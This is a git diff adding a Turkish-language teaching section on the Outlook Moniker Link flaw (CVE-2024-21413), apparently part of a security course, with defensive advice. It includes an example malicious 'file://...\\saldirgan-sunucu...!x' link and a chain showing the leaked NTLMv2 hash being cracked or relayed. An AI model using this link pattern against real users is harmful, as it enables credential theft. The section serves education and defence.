@@ -78,6 +78,27 @@ sequenceDiagram
 
 Bu zincir, [log-analizi.md](../11-soc-mavi-takim/log-analizi.md) Senaryo B'deki `Outlook→Word→PowerShell→C2` süreç zincirinin saldırgan tarafıdır. Savunmacı bu zinciri loglardan tersine okur.
 
+### Tıklama gerektirmeyen kimlik sızması: Moniker Link (CVE-2024-21413)
+
+Phishing her zaman "sahte giriş sayfası" ya da "makrolu ek" değildir. Bazı saldırılar, kurbanın **parolasını girmesine bile gerek kalmadan** kimlik bilgisini sızdırır. Bunun öğretici bir örneği, Microsoft Outlook'taki **Moniker Link** zafiyetidir (CVE-2024-21413, Check Point Research tarafından bulundu, Şubat 2024'te yamalandı; CVSS 9.8 *(kesin CVSS ve teknik ayrıntı biçimi doğrulanmalı — bu oturumda canlı kaynak teyidi yapılamadı)*).
+
+**Mekanizma:** Outlook normalde yerel/uzak dosyalara giden `file://` bağlantılarını "Protected View" (Korumalı Görünüm) ile bloke eder veya uyarı verir. Zafiyet, bağlantı hedefinin sonuna bir **ünlem işareti (`!`)** ve rastgele metin eklendiğinde (ör. `file:///\\saldirgan-sunucu\paylasim\dosya.rtf!x`) bu korumanın atlanmasıdır — Outlook bunu bir "Moniker Link" olarak COM üzerinden işler. Sonuç: kurban e-postayı açtığında (veya önizlediğinde) Outlook, saldırganın SMB sunucusuna (`\\saldirgan-sunucu`) otomatik bağlanır ve bu bağlantı sırasında kullanıcının **NTLMv2 kimlik doğrulama hash'ini** ([windows-temelleri.md](../02-linux-windows/windows-temelleri.md) SAM/NTLM) sunucuya sızdırır.
+
+**Neden bu kadar önemli — zincir:** Bu, tek bir zafiyetin nasıl bir saldırı zincirine dönüştüğünün ders niteliğinde örneğidir:
+
+```mermaid
+flowchart LR
+    A["1. Phishing e-postası<br/>(Moniker Link, file://...!)"] --> B["2. Outlook otomatik SMB bağlantısı<br/>(\\\\saldirgan-sunucu)"]
+    B --> C["3. NTLMv2 hash sızar<br/>(kurban parola girmedi!)"]
+    C --> D["4a. Offline kırma<br/>(hashcat/John)"]
+    C --> E["4b. NTLM relay<br/>(hash'i başka sisteme yönlendir)"]
+    D & E --> F["Kimlik ele geçirildi"]
+```
+
+Sızan NTLMv2 hash'i saldırganın iki yolu vardır: **(a) offline kırma** — hedefin göremediği, hızlı, sessiz bir işlem ([../05-kriptografi/pratik-lab/hash_kirma_john_hashcat.md](../05-kriptografi/pratik-lab/hash_kirma_john_hashcat.md); online brute-force ile farkı → [../10-pentest-metodolojisi/somuru-ve-sonrasi.md](../10-pentest-metodolojisi/somuru-ve-sonrasi.md) §1.5); veya **(b) NTLM relay / Pass-the-Hash** — hash'i hiç kırmadan doğrudan başka bir sisteme kimlik olarak sunma ([../02-linux-windows/windows-temelleri.md](../02-linux-windows/windows-temelleri.md)). NTLM'in salt kullanmaması ([../05-kriptografi/temel-kavramlar.md](../05-kriptografi/temel-kavramlar.md)) offline kırmayı kolaylaştırır.
+
+> **Savunma:** Outlook/Windows yamalarını güncel tut (bu spesifik CVE yamalı); giden SMB (port 445) trafiğini kurumsal ağdan dışarıya engelle (böylece NTLM hash dışarı sızamaz); NTLM'i mümkünse Kerberos/modern kimlik ([../02-linux-windows/windows-temelleri.md](../02-linux-windows/windows-temelleri.md)) lehine devre dışı bırak. **Benzer teknikler** (SMB'ye zorunlu kimlik doğrulama ile NTLM sızdırma) tek bir CVE'ye özgü değildir — UNC yolları, `.lnk`, `.url`, resim `src`'leri ve belge şablonları da tarihsel olarak bu amaçla kullanılmıştır; kök sorun Windows'un `\\sunucu\...` görünce **otomatik ve şeffaf kimlik doğrulaması**dır.
+
 ---
 
 ## 4. Phishing e-posta analizi (savunmacı becerisi)
